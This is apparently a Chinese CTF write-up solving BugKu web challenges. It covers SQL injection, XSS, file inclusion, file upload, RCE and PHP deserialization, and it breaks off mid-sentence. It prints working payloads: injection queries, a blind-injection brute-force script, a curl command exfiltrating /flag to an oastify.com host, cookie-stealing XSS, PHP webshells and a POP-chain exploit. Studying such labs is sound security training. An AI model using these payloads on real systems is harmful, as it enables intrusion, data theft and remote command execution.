\"<p>sorry!</p>\";\n    }\n}\n?>\n```\n\n考查的是file_get_contents()函数，不会的自行百度哈\n\n大致意思就是要上传 ac和fn两个参数\n\n且ac的值等于fn文件内容的值,但是这里的话是没法满足判断句的，那我们试着绕过一下这个判断句\n\nfile_get_contents()绕过我们用伪协议进行绕过\n\npayload:\n\n![image-20241126140411099](./../image/achieve/202411/BUGKU/image-20241126140411099.png)\n\n## 成绩查询\n\n### #SQL联合注入\n\n用1和1'测试闭合方式，发现是单引号闭合\n\n用order by测试回显字段数发现字段数是4\n\n用union select查看回显位置\n\n-1' union select 1,2,3,4#\n\n![image-20241126141535282](./../image/achieve/202411/BUGKU/image-20241126141535282.png)\n\n既然没有过滤那就用联合查询进行注入\n\n```\n查询数据库名\n-1' union select 1,database(),3,4#\n查询表名\n-1' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='skctf'),3,4#\n查询表中列名\n-1' union select 1,(select group_concat(column_name)from information_schema.columns where table_name='fl4g'),3,4#\n查询列中数据\n-1' union select 1,(select group_concat(skctf_flag)from skctf.fl4g),3,4#\n```\n\n## no select\n\n### #万能密码\n\n猜测是开始有过滤了，而且过滤的还是select\n\n我试了一下万能密码发现能打通\n\n```\n1' or 1=1#\n```\n\n## login2\n\n### #sql注入md5绕过\n\n测试之后发现都是登录失败，抓包看看有没有什么线索\n\n![image-20241126143402053](./../image/achieve/202411/BUGKU/image-20241126143402053.png)\n\n发现一个tip很显眼啊，拿去解码一下\n\n```php\n$sql=\"SELECT username,password FROM admin WHERE username='\".$username.\"'\";\nif (!empty($row) && $row['password']===md5($password)){\n}\n```\n\n这里的话是需要让row中password的md5值等于password，但是这里的话我们是不知道里面有哪些用户和密码的，这时候有个思路就是\n\n通过输入不存在的用户构造新的用户和密码去进行登录\n\n```\nusername=admin' union select 1,'md5(123)'#&password=123  \n这里将123的md5值换进去就行\n```\n\n![image-20241126145315853](./../image/achieve/202411/BUGKU/image-20241126145315853.png)\n\n这里可以看到一个index.php，我们访问一下\n\n![image-20241126145257655](./../image/achieve/202411/BUGKU/image-20241126145257655.png)\n\n无回显RCE可以直接打curl外带\n\n```\n1;curl -X POST -F xx=@/flag  http://yacgwxvhy7jd2crte67tuxg8lzrqfg35.oastify.com\n```\n\n这里换成bp里面服务器collarborator的地址，然后进行poll now就行了\n\n![image-20241126145916680](./../image/achieve/202411/BUGKU/image-20241126145916680.png)\n\n或者也可以直接写文件\n\n```\npayload:123 | cat /flag >1.php\n```\n\n查看 flag文件并输出到1.php里边\n\n```\n1.php可以在网站子目录查看内容拿到flag\n```\n\n## sql注入\n\n### #基于布尔的sql盲注\n\n```\nadmin/1   password error!\nadmin'/1  username does not exist!\n```\n\n注入点应该就是username了，然后fuzz一下过滤，发现空格被过滤了，用联合注释符绕过就行\n\n```\n1' /1  username does not exist!\n1'||(length(database())>0)# / 1  password error!\n1'||(length(database())<0)# / 1  username does not exist!\n```\n\n1用户是不存在的，但是因为我们的or语句，右边是满足的，所以返回true，所以第二个测试回显密码错误而不是用户不存在\n\n在构造的时候发现过滤了逗号，还过滤了for，那就不能截取字符了，但是like也被过滤了，不过能用regexp\n\n测出来数据库名是以b开头的\n\n```\n1'||((select(database()))regexp('^b'))#password error!\n1'||((select(database()))regexp('^c'))#username does not exist!\n```\n\n既然测出来回显信息了那就直接打吧\n\n```python\nimport requests\n\nurl = \"http://117.72.52.127:13589/index.php\"\nletter = \"0123456789abcdefghijklmnopqrstuvwxyz-{}\"\ntarget = \"\"\n\nfor i in range(1,100):\n\n    for j in letter:\n\n        #payload = f\"1'||((select(database()))regexp('^{target+j}'))#\"\n        payload = f\"1'||((select(group_concat(password))from(blindsql.admin))regexp('^{target + j}'))#\"\n\n        data = {\n            \"username\" : payload,\n            \"password\" : \"1\"\n        }\n        r = requests.post(url,data=data)\n        if \"password error!\" in r.text:\n            sign = 1\n            target += j\n            print(target)\n            break\n```\n\n拿到密码4dcc88f8f1bc05e7c2ad1a60288481a2后登录发现不对，md5？解密一下https://www.somd5.com/\n\n![image-20250611175944476](../image/achieve/202411/BUGKU/image-20250611175944476.png)\n\n## 都过滤了\n\n\n\n### 留言板\n\n输入正常的xss语句看看效果\n\n```\n<script>alert('xss')</script>\n```\n\n发现括号被转化成|\n\n扫目录发现了两个文件\n\n/admin.php\n\n/db.sql\n\nadmin.php是一个登录界面，但是这个db.sql访问是404，不知道是环境问题还是什么，所以只好从大佬的wp上摘下来了\n\n```\n# Host: localhost  (Version: 5.5.53)\n# Date: 2019-08-04 16:13:22\n# Generator: MySQL-Front 5.3  (Build 4.234)\n \n/*!40101 SET NAMES utf8 */;\n \n#\n# Structure for table \"text\"\n#\n \nCREATE DATABASE xss DEFAULT CHARACTER SET utf8;\nuse xss; \n \nDROP TABLE IF EXISTS `text`;\nCREATE TABLE `text` (\n  `Id` int(11) NOT NULL AUTO_INCREMENT,\n  `text` varchar(255) DEFAULT NULL,\n  PRIMARY KEY (`Id`)\n) ENGINE=MyISAM DEFAULT CHARSET=utf8;\n \n#\n# Data for table \"text\"\n#\n \n/*!40000 ALTER TABLE `text` DISABLE KEYS */;\n/*!40000 ALTER TABLE `text` ENABLE KEYS */;\n \n#\n# Structure for table \"user\"\n#\n \nDROP TABLE IF EXISTS `user`;\nCREATE TABLE `user` (\n  `Id` int(11) NOT NULL AUTO_INCREMENT,\n  `username` varchar(255) DEFAULT NULL,\n  `password` varchar(255) DEFAULT NULL,\n  PRIMARY KEY (`Id`)\n) ENGINE=MyISAM DEFAULT CHARSET=utf8;\n \n#\n# Data for table \"user\"\n#\n \n/*!40000 ALTER TABLE `user` DISABLE KEYS */;\nINSERT INTO `user` VALUES (1,'admin','011be4d65feac1a8');\n/*!40000 ALTER TABLE `user` ENABLE KEYS */;\n```\n\n底下的话就是登录的账号密码，\n\n登录后看到了我刚刚传入的(括号，那我们返回去注入一下xss语句\n\n\\<script>alert(1)\\</script>\n\n登录后可以看到有弹窗\n\n![image-20241126153642287](./../image/achieve/202411/BUGKU/image-20241126153642287.png)\n\n那我们看一下admin的cookie中有没有flag\n\n```html\n<script>alert(document.cookie)</script>\n```\n\n![image-20241126155017757](./../image/achieve/202411/BUGKU/image-20241126155017757.png)\n\n刚好admin的cookie里面就有flag，把前后的编码换成花括号就行了\n\n# 留言板1\n\n\\<script>document.location.href=\"http://[ip]/xss.php?cookie=\"+document.cookie</script>\n\n发现script,http被过滤,还有长度限制\n\n不过好像我的服务器接收不到数据，也不知道为啥，应该是平台的环境问题\n\n# 文件包含\n\n![image-20241126160635726](./../image/achieve/202411/BUGKU/image-20241126160635726.png)\n\n看到那个click就点了，第一眼感觉像是任意文件读取，但是单单的file=index.php是没办法获取源代码的，我们需要用伪协议去读取源代码\n\n```\n获取源码代码\n?file=php://filter/resource=xxx.php\n\n通常获取源代码时，伪协议将xxx.php当文件执行，\n使得很多信息往往不能直接显示在浏览器页面上，通常使用base64编码后再显示\n?file=php://filter/read=convert.base64-encode/resource=index.php\n\n```\n\n页面回显了base64编码\n\n解码后得到\n\n```php\n<html>\n    <title>Bugku-web</title>\n    \n<?php\n\terror_reporting(0);\n\tif(!$_GET[file]){echo '<a href=\"./index.php?file=show.php\">click me? no</a>';}\n\t$file=$_GET['file'];\n\tif(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){\n\t\techo \"Oh no!\";\n\t\texit();\n\t}\n\tinclude($file); \n//flag:flag{f81f50efef059669689aa4c5b9831c7a}\n?>\n</html>\n\n```\n\n不过我发现直接读flag也是可以读到了，?file=/flag直接就能拿到flag了\n\n# cookie\n\n题目提示是cookie欺骗，直接看cookie发现了一个fla，拿去提交发现是假的flag\n\n![image-20241126161220352](./../image/achieve/202411/BUGKU/image-20241126161220352.png)\n\n在url中有a2V5cy50eHQ=，拿去解码发现是一个keys.txt，我们访问一下发现和刚刚的页面内容是一样的，猜测是这个网页访问了一个文本文档，然后我就试着访问一下flag.txt和flag.php发现什么都没有，我就猜测了一下index.php\n\n![image-20241126162309858](./../image/achieve/202411/BUGKU/image-20241126162309858.png)\n\n修改了line发现有不同的内容，后面访问了n个line后才拿到完整的源码\n\n```php\nerror_reporting(0);\n$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");\n$line=isset($_GET['line'])?intval($_GET['line']):0;\nif($file=='') header(\"location:index.php?line=&filename=a2V5cy50eHQ=\");\n$file_list = array(\n'0' =>'keys.txt',\n'1' =>'index.php',\n);\nif(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){\n$file_list[2]='keys.php';\n}\nif(in_array($file, $file_list)){\n$fa = file($file);\necho $fa[$line];\n}\n?>\n```\n\n看到源码就好做了，设置cookie里面的margin等于margin然后访问keys.php\n\n![image-20241126163042405](./../image/achieve/202411/BUGKU/image-20241126163042405.png)\n\n# never_give_up\n\n在源码中发现了1p.html，但是访问了会跳转到bugku的官方，那我们抓包拦截一下\n\n![image-20241126163517748](./../image/achieve/202411/BUGKU/image-20241126163517748.png)\n\n发现了很多被注释掉的语句，这是多层解码\n\n第一层\n\n![image-20241126164155012](./../image/achieve/202411/BUGKU/image-20241126164155012.png)\n\n第二层\n\n![image-20241126164215358](./../image/achieve/202411/BUGKU/image-20241126164215358.png)\n\n第三层\n\n![image-20241126164233124](./../image/achieve/202411/BUGKU/image-20241126164233124.png)\n\n最后得到\n\n```php\n\";if(!$_GET['id'])\n{\n\theader('Location: hello.php?id=1');\n\texit();\n}\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.'))\n{\n\techo 'no no no no no no no';\n\treturn ;\n}\n$data = @file_get_contents($a,'r');\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n{\n\t$flag = \"flag{***********}\"\n}\nelse\n{\n\tprint \"never never never give up !!!\";\n}\n\n\n?>\n```\n\n**条件**\n\n- **变量 $id 弱等于整型数 0**\n- **变量 $b 的长度大于 5**\n- **字符串 1114 要与字符串 111 连接变量 $b 的第一个字符构成的正则表达式匹配**\n- **变量 $b 的第一个字符弱不等于整型数 4**\n- **变量 $data 弱等于字符串 bugku is a nice plateform!** \n\n`reg()` 函数或 `eregi()` 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。\n\n绕过file_get_contents()函数用前面的方法就行，所以我们用伪协议去做\n\n![image-20241126165219445](./../image/achieve/202411/BUGKU/image-20241126165219445.png)\n\n# 文件包含2\n\n![image-20241127122221343](./../image/achieve/202411/BUGKU/image-20241127122221343.png)\n\n和前面的一样，有?file=的格式，在源码中发现了upload.php，访问发现是一个上传文件的页面\n\n![image-20241127122335565](./../image/achieve/202411/BUGKU/image-20241127122335565.png)\n\n经过测试发现这里对content头和后缀名进行了验证，然后也过滤了\\<?php 和?>,这样的话我们就只能换成phtml的马去做了\n\n## 方法一:一句话木马+蚁剑连马\n\n```html\n<script language=\"php\">eval($_REQUEST[cmd])</script>\n```\n\n上传后修改文件后缀和content-type头\n\n![image-20241128155958367](./../image/achieve/202411/BUGKU/image-20241128155958367.png)\n\n看见上传成功了，我们访问一下这个http://114.67.175.224:11279/index.php?file=upload/202411280758367957.jpg\n\n访问成功后用蚁剑连接就可以了\n\n## 方法二：rce\n\n我没做记录，所以直接拿的别的师傅的讲一下\n\n新建一个txt文件写入 \\<script language=php>system(\"ls\")\\</script> 后另存为 jpg 格式进行上传\n\n上传成功后访问文件可以得到我们页面的文件目录\n\n![img](./../image/achieve/202411/BUGKU/3e1c733f53829f722a89291b2a924c09.png)\n\n然后访问：http://123.206.31.85:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt\n\n# ezbypass\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nif (isset($_POST['code'])) {\n    $code = $_POST['code'];\n    if (strlen($code) <= 105){\n        if (is_string($code)) {\n            if (!preg_match(\"/[a-zA-Z0-9@#%^&*:{}\\-<\\?>\\\"|`~\\\\\\\\]/\",$code)){\n                eval($code);\n            } else {\n                echo \"Hacked!\";\n            }\n        } else {\n            echo \"You need to pass in a string\";\n        }\n    } else {\n            echo \"long?\";\n    }\n}\n```\n\n看到正则匹配直接用脚本把能用的字符输出出来看一下\n\n```php\n<?php\nfor ($i=32;$i<127;$i++){\n        if (!preg_match('/[a-zA-Z0-9@#%^&*:{}\\-<\\?>\\\"|`~\\\\\\\\]/',chr($i))){#替换题目中的正则表达式就行\n            echo chr($i).\" \";\n        }\n}\n#输出! $ ' ( ) + , . / ; = [ ] _ \n?>\n```\n\n就是很经典的无字母数字rce了，可以用自增，异或，取反进行rce\n\n我这里用自增进行rce\n\n```php\n<?php\n$_=(_/_._)[_];\n#var_dump($_); # 输出N\n$_++; \n$__=$_.$_++;\n$_++;$_++;$_++;\n$__=$__.$_;\n$_++;\n$__=$__.$_;\n$_=_.$__;\n#var_dump($_); # 输出_POST\n$$_[_]($$_[__]);\n#也就是 $_POST[_]($_POST[__])\n\n```\n\n解释如下：\n\n- $_POST 变量用来收集表单数据，\n- 这里\\$\\_POST[\\_] ($\\_POST\\[\\_\\_]),就是要给_和__进行传参，（）的意思应该是分传参的先后次序咯。\n\n最后的payload就是\n\n```\n_=system&__=cat /flag&code=%24_%3D(_%2F_._)%5B_%5D%3B%24_%2B%2B%3B%24__%3D%24_.%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24__.%24_%3B%24_%2B%2B%3B%24__%3D%24__.%24_%3B%24_%3D_.%24__%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B\n\n```\n\n![image-20241128163337774](./../image/achieve/202411/BUGKU/image-20241128163337774.png)\n\n# No one knows regex better than me\n\n```php\n<?php \nerror_reporting(0);\n$zero=$_REQUEST['zero'];\n$first=$_REQUEST['first'];\n$second=$zero.$first;\nif(preg_match_all(\"/Yeedo|wants|a|girl|friend|or|a|flag/i\",$second)){\n    $key=$second;\n    if(preg_match(\"/\\.\\.|flag/\",$key)){\n        die(\"Noooood hacker!\");\n    }else{\n        $third=$first;\n        if(preg_match(\"/\\\\|\\056\\160\\150\\x70/i\",$third)){\n            $end=substr($third,5);\n            highlight_file(base64_decode($zero).$end);//maybe flag in flag.php\n        }\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n```\n\n这里有三层验证，我们逐个进行分析\n\n第一层，将我们传入的zero和first两个参数拼接然后进行正则匹配，所以我们两个参数中只要有一个参数包含里面其中一个就可以了\n\n第二层，将我们的second变量赋值给key然后进行正则匹配，如果key中有..或者flag就会执行die函数\n\n第三层，\n\n\\056  为八进制  代表  句点或小数点\n\n\\160  为八进制  代表  小写字母 p\n\n\\150  为八进制  代表  小写字母 h\n\n\\x70  为十六进制 代表  小写字母 p\n\n对first参数进行正则匹配，如果参数中包含|.php才能通过验证\n\n最后会对zero进行base64解码，因为是highlight_file()函数，所以我们的zero.end应该是flag.php的文件名\n\n所以我们的payload\n\n```\n?first=aaaa|.php&zero=ZmxhZw==\n```\n\n![image-20241128170957161](./../image/achieve/202411/BUGKU/image-20241128170957161.png)\n\n# 字符？正则？\n\n```php\n<?php \nhighlight_file('2.php');\n$key='flag{********************************}';\n$IM= preg_match(\"/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);\nif( $IM ){ \n  die('key is: '.$key);\n}\n?>\n```\n\n先解释一下这句代码\n\n$IM= preg_match(\"/key.*key.{4,7}key:\\/.\\/(.*key)\\[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);\n\n1. `/`: 正则表达式的开始和结束标记。\n2. `key.*key`: 匹配以 `key` 开头和结尾，中间任意字符（`.*` 表示零个或多个任意字符）的子字符串。\n3. `.{4,7}`: 匹配任意字符（`.`）4到7次。\n4. `key:\\/.\\/`: 匹配 `key:/./` 这个子字符串。\n5. `(.*key)`: 匹配任意字符（`.*`）直到遇到 `key`，并将匹配的部分捕获到一个分组中。\n6. `[a-z]`: 匹配任意小写字母。\n7. `[[:punct:]]`: 匹配标点字符。\n8. `/i`: 表示不区分大小写进行匹配。\n9. 综合起来，这个正则表达式的大致含义是：匹配包含以下模式的字符串：\n   - 以 `key` 开头，中间包含任意字符，以 `key` 结尾。\n   - 中间有 4 到 7 个任意字符。\n   - 包含特定字符串 `key:/./`。\n   - 捕获从上一个 `key` 到下一个 `key` 之间的任意字符序列。\n   - 之后是一个小写字母和一个标点字符。\n\n在这行代码中，`preg_match` 函数将检查 `$_GET[\"id\"]` 中的内容是否符合上述正则表达式的模式。如果匹配成功，则返回值 `$IM` 为 1，匹配的结果会存储在数组 `$match` 中。如果匹配失败，则返回值为 0。\n\n所以我们这里的话是需要匹配结果为1才能执行if语句拿到flag\n\n那我们顺着他的匹配去就行\n\npayload\n\n```\n?id=key1234keyaaaakey:/./akeyx.\n```\n\n![image-20241128172752782](./../image/achieve/202411/BUGKU/image-20241128172752782.png)\n\n# Flask_FileUpload\n\n![image-20241128172945377](./../image/achieve/202411/BUGKU/image-20241128172945377.png)\n\n需要的是python的文件执行命令\n\n```python\nimport os\nprint(os.system('ls -al'))\n```\n\n- 通过 `os` 模块，你可以访问操作系统的功能，如文件操作、进程管理、环境变量等。\n\n改成jpg或者png格式就会执行\n\n![image-20241128173135766](./../image/achieve/202411/BUGKU/image-20241128173135766.png)\n\n上传后成功了但是并没有看到执行结果，我们用bp抓包试试\n\n![image-20241128173236951](./../image/achieve/202411/BUGKU/image-20241128173236951.png)\n\n有但是不在该目录，我们看一下根目录，直接在bp里面改代码就行\n\n![image-20241128173310736](./../image/achieve/202411/BUGKU/image-20241128173310736.png)\n\n看到了，然后我们修改一下命令\n\n![image-20241128173332219](./../image/achieve/202411/BUGKU/image-20241128173332219.png)\n\n# xxx二手交易市场\n\n![image-20241128173757042](./../image/achieve/202411/BUGKU/image-20241128173757042.png)\n\n简单看了一下源代码发现没什么可用信息，不过我发现了登录和注册的口子\n\n额，黑盒测试，得一个个慢慢测，在登录注册界面进行sql注入发现不得行，所以这里的话还是一个文件上传，口子在上传头像那里\n\n![image-20241128174432109](./../image/achieve/202411/BUGKU/image-20241128174432109.png)\n\n上传头像然后抓包，这样操作更方便\n\n先是写了一个php一句话木马，但是发现都提交不上去\n\n![image-20241128174723382](./../image/achieve/202411/BUGKU/image-20241128174723382.png)\n\n应该是有前端验证了，那我们改后缀改成jpg或者png格式再上传一次\n\n好吧假造不出来，估计是对文件内容进行了验证\n\n那我们先上传一个正常的图片\n\n![image-20241128203028580](./../image/achieve/202411/BUGKU/image-20241128203028580.png)\n\n这里可以看到我们发现是进行了base64加密的并且这里使用的是data协议来上传，，那我们写个一句话木马，然后进行base64编码\n\n![在这里插入图片描述](./../image/achieve/202411/BUGKU/42d440b0ce7108e92c4ae70ac4370adb.png)\n\n然后把jpeg改成php，让php来作为文件后缀\n\n![image-20241128203743086](./../image/achieve/202411/BUGKU/image-20241128203743086.png)\n\n可以得到一个图片路径，将这个路径去掉\\号并与去掉/User的原本路径合并起来，让蚁剑进行连接就可以拿到flag了\n\n# 文件上传\n\n![image-20241128204146405](./../image/achieve/202411/BUGKU/image-20241128204146405.png)\n\n指明了不能传php格式，不过我们还是先把我们的一句话木马上传看一下回显\n\n![image-20241128204351461](./../image/achieve/202411/BUGKU/image-20241128204351461.png)\n\n无效文件，那我们改成jpg传看一下\n\n![image-20241128204456485](./../image/achieve/202411/BUGKU/image-20241128204456485.png)\n\n这里可以看到是上传成功了的，说明并没有对文件内容进行一定的检查，那就试一下是不是对其他地方进行了检测\n\n然后我测试半天都没搞明白，就直接看别人的wp了\n\n大佬的wp：\n\n使用burp抓包，不断尝试发现发现需要修改的地方有三个：\n\n一个是http head里的Content-Type: multipart/form-data;\n请求头部的 Content-Type 内容 随便改个大写字母过滤掉 比如 mulTipart/form-data （其t为大写）\nMultipart里的部分字母改成大写的。\n\n第二个是文件的的Content-Type: application/octet-stream，改成image/jpeg\n\n第三个是文件后缀名改成php4\n（依次尝试php4，phtml，phtm，phps，php5（包括一些字母改变大小写））分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php4没有被过滤\n\n1. Multipart/form-data\n   - 表示请求体是以多部分形式编码的。这种编码方式通常用于表单上传文件或包含文件和其他字段的复杂数据。\n\n# getshell\n\n![image-20241128212239416](./../image/achieve/202411/BUGKU/image-20241128212239416.png)\n\nnb，全是编码，php混淆解密，我们直接用网上的解密工具进行解密\n\n```php\n<?php\nhighlight_file(__FILE__);\n@eval($_POST[ymlisisisiook]);\n?>\n```\n\n看到是一句话木马，我们试着连一下\n\n![image-20241128213541200](./../image/achieve/202411/BUGKU/image-20241128213541200.png)\n\n![image-20241128222005854](./../image/achieve/202411/BUGKU/image-20241128222005854.png)\n\n访问不了emm，应该是要绕过disable——functions，这就得用蚁剑的插件了\n\n![img](./../image/achieve/202411/BUGKU/f71dc38c4b754549934728d23ebe5af9.png)\n\n![image-20241128222432176](./../image/achieve/202411/BUGKU/image-20241128222432176.png)\n\n点击开始后会生成一个php木马文件，我们连接一下那个木马文件\n\n![image-20241128222507466](./../image/achieve/202411/BUGKU/image-20241128222507466.png)\n\n就可以发现里面的目录都可以访问了\n\n# 点login咋没反应\n\n![image-20241128223135671](./../image/achieve/202411/BUGKU/image-20241128223135671.png)\n\n这道题的话是login点不了\n\n查看源码发现一个admin.css\n\n![image-20241128223616330](./../image/achieve/202411/BUGKU/image-20241128223616330.png)\n\n让我们试一下?8033\n\n![image-20241128223646498](./../image/achieve/202411/BUGKU/image-20241128223646498.png)\n\n拿到源码了\n\n这里的话是需要我们设置一个cookie中的BUGKU值为(s:13:\"ctf.bugku.com\";)这样反序列化出来才会是ctf.bugku.com\n\n所以我们抓包并设置cookie值，注意这里不要访问?8033\n\n![image-20241128224310295](./../image/achieve/202411/BUGKU/image-20241128224310295.png)\n\n# Simple_SSTI_1\n\n很简单的一个ssti注入哈\n\nYou need pass in a parameter named flag。提示我们需要传入一个flag参数，我们先查看一下源代码\n\n![image-20241128234822499](./../image/achieve/202411/BUGKU/image-20241128234822499.png)\n\n说明我们这里有一个变量是secret_key，那我们访问一下这个变量\n\n![image-20241128235253516](./../image/achieve/202411/BUGKU/image-20241128235253516.png)\n\n# 兔年大吉2\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass Happy{\n    private $cmd;\n    private $content;\n\n    public function __construct($cmd, $content)\n    {\n        $this->cmd = $cmd;\n        $this->content = $content;\n    }\n\n    public function __call($name, $arguments)\n    {\n        call_user_func($this->cmd, $this->content);\n    }\n\n    public function __wakeup()\n    {\n        die(\"Wishes can be fulfilled\");\n    }\n}\n\nclass Nevv{\n    private $happiness;\n\n    public function __invoke()\n    {\n        return $this->happiness->check();\n    }\n\n}\n\nclass Rabbit{\n    private $aspiration;\n    public function __set($name,$val){\n        return $this->aspiration->family;\n    }\n}\n\nclass Year{\n    public $key;\n    public $rabbit;\n\n    public function __construct($key)\n    {\n        $this->key = $key;\n    }\n\n    public function firecrackers()\n    {\n        return $this->rabbit->wish = \"allkill QAQ\";\n    }\n\n    public function __get($name)\n    {\n        $name = $this->rabbit;\n        $name();\n    }\n\n    public function __destruct()\n    {\n        if ($this->key == \"happy new year\") {\n            $this->firecrackers();\n        }else{\n            print(\"Welcome 2023!!!!!\");\n        }\n    }\n}\n\nif (isset($_GET['pop'])) {\n    $a = unserialize($_GET['pop']);\n}else {\n    echo \"过新年啊~过个吉祥年~\";\n}\n?> 过新年啊~过个吉祥年~\n```\n\n魔术方法:\n\n- `__call`: 在对象中调用一个不可访问方法时被调用\n- `__invoke`： 当一个对象被作为函数调用时被调用\n- `__set`: 当对象设置一个不存在的属性时调用\n- `__get`： 当对象访问一个不存在的属性时调用\n\n是一道反序列化的题目，那我们先构造pop链\n\n构造pop链，我一般会先找到链子的出口，也就是能造成恶意攻击的地方\n\n```php\n    public function __call($name, $arguments)#在对象上下文中调用不可访问的方法时触发\n    {\n        call_user_func($this->cmd, $this->content);#cmd作为回调函数的函数名，content作为传入函数的参数\n    }\n```\n\n这里可以看到call_user_func()函数就是可以进行恶意rce 的地方，所以他就是我们链子的出口，，找到出口了我们进行倒推，可以看到触发call_user_func()方法的前提是在对象上下文中调用不可访问的方法，那我们找一下这里哪有有调用不可访问或者不存在的方法\n\n```php\nclass Nevv{\n    private $happiness;\n\n    public function __invoke()#当你尝试将一个对象像函数一样调用时触发这个方法\n    {\n        return $this->happiness->check();\n    }\n\n}\n```\n\n这里的话可以看到在这个invoke方法中进行了一个不可访问方法的调用，所以这里会触发我们的call方法，那么我们的pop链就是\n\n```\nNevv::__invoke()->Happy::__call()\n```\n\n我们继续往前推，为了触发这个invoke方法，我们需要将对象像函数一样调用\n\n```php\n    public function __get($name)#读取不可访问或者是不存在的属性时触发\n    {\n        $name = $this->rabbit;\n        $name();\n    }\n```\n\n这里的话其实并不像上面那么明显，但是我们经过排除可以确定是可以通过这个方法去触发invoke方法，为什么呢?因为这个方法里面有$name()，所以如果我们让name的值为一个对象，就可以将对象像函数一样调用，然后就可以触发invoke方法，继续完善我们的pop链\n\n```\nYear::__get()->Nevv::__invoke()->Happy::__call()\n```\n\n继续，为了触发get方法，条件就不赘述了，上面都有\n\n```php\n\n    public function firecrackers()\n    {\n        return $this->rabbit->wish = \"allkill QAQ\";\n    }\n    public function __set($name,$val){#将数据写入不可访问或者不存在的属性时触发\n        return $this->aspiration->family;\n    }\n```\n\n这里可以看到两个方法都是访问了一个不存在的属性，但是我们可以看到在set方法的触发条件是将数据写入一个不可访问的属性，那刚好就是我们fircrackers方法的作用了，所以我们完整的pop链就是\n\n```\nYear::firecrackers()->Rabbit::__set()->Year::__get()->Nevv::__invoke()->Happy::__call()\n```\n\n但是因为我们的pop链需要触发的入口，所以我们可以通过destruct或者construct去触发我们的pop链，在Year类里面我们可以看到destruct方法\n\n```php\n   public function __destruct()\n    {\n        if ($this->key == \"happy new year\") {\n            $this->firecrackers();\n        }else{\n            print(\"Welcome 2023!!!!!\");\n        }\n    }\n```\n\n这里有调用firecrackers方法，所以这个可以作为我们的入口，那么我们完整的pop链就是\n\n```\nYear::__destruct()->Year::firecrackers()->Rabbit::__set()->Year::__get()->Nevv::__invoke()->Happy::__call()\n```\n\n根据pop链构造EXP\n\n```php\n<?php\nclass Happy{\n    private $cmd;\n    private $content;\n\n    public function __construct($cmd, $content){\n        $this->cmd = $cmd;\n        $this->content = $content;\n    }\n}\n\nclass Nevv{\n    private $happiness;\n\n    public function __construct($happiness){\n        $this->happiness=$happiness;\n    }\n}\n\nclass Rabbit{\n    private $aspiration;\n    public function __construct($aspiration){\n        $this->aspiration=$aspiration;\n    }\n}\n\nclass Year{\n    public $key=\"happy new year\";\n    public $rabbit;\n}\n$a=new Year();\n$b=new Year();\n$c=new Rabbit($b);\n$e=new Happy(\"system\",\"tac /flag\");\n$d=new Nevv($e);\n\n$a->rabbit=$c;\n$b->rabbit=$d;\n\necho urlencode(serialize($a));\n?>\n\n```\n\n# unserialize-Noteasy\n\n```php\n<?php\n\nif (isset($_GET['p'])) {\n    $p = unserialize($_GET['p']);\n}\nshow_source(\"index.php\");\n\nclass Noteasy\n{\n    private $a;\n    private $b;\n\n    public function __construct($a, $b)\n    {\n        $this->a = $a;\n        $this->b = $b;\n        $this->check($a.$b);\n        eval($a.$b);\n    }\n\n\n    public function __destruct()\n    {\n        $a = (string)$this->a;\n        $b = (string)$this->b;\n        $this->check($a.$b);\n        $a(\"\", $b);\n    }\n\n\n    private function check($str)\n    {\n        if (preg_match_all(\"(ls|find|cat|grep|head|tail|echo)\", $str) > 0) die(\"You are a hacker, get out\");\n    }\n\n\n    public function setAB($a, $b)\n    {\n        $this->a = $a;\n        $this->b = $b;\n    }\n}\n```\n\n不会做，直接去学别人的做法了\n\n利用的是create_function()的特性，那我们先了解一下这个函数\n\n## create_function()\n\n`create_function()` 是 PHP 中的一个函数，用于创建一个匿名函数。\n\n基础语法\n\n```php\nstring create_function(string $args, string $code)\n```\n\n- `args`：是一个代表函数参数的字符串，参数之间用逗号分隔。\n- `$code`：是一个包含函数体代码的字符串。\n\n举个例子\n\n```php\n$myFunction = create_function('$a, $b', 'return $a + $b;');\necho $myFunction(2, 3); // 输出 5\n```\n\n创建了一个匿名函数，接受两个参数 `$a` 和 `$b`，然后返回这两个参数的和。\n\n```php\n\n$double = create_function('$num', 'return $num * 2;');\necho $double(5); // 输出10\n```\n\n创建了一个匿名函数，接受参数$num，函数执行代码是返回这个参数的两倍值\n\n拿刚刚第一个例子来说，我们通过create_function()创建出来的方法就是\n\n```php\nfunction($a,$b){\n    return $a+$b;\n}\n```\n\n那接下来我们来看题目\n\n因为反序列化是不会触发构造函数的，所以我们可以忽略他，我们来看一下析构函数\n\n```php\n    public function __destruct()\n    {\n        $a = (string)$this->a;\n        $b = (string)$this->b;\n        $this->check($a.$b);\n        $a(\"\", $b);\n    }\n```\n\n我们注意到$a(\"\",$b);是符合我们create_function()的语法的，那我们令$a=create_function,但是我们只有第二个参数可控，所以这时候的方法结构就是\n\n```php\nfunction(){\n    $b\n}\n```\n\n但是有一个点我们需要注意，我们创建的方法是不会自动调用的，所以我们如果想要通过这里去执行命令的话，需要先把我们的function闭合，然后在function外写相关的命令去执行，例如\n\n```php\nfunction(){\n    ;\n}\nsystem(\"ls\");\n```\n\n但是单单是这样是不够的，我们如果只是让$b=;}system(\"ls\");的话，就会是这样的\n\n```php\nfunction(){\n    ;}\nsystem(\"l\\s 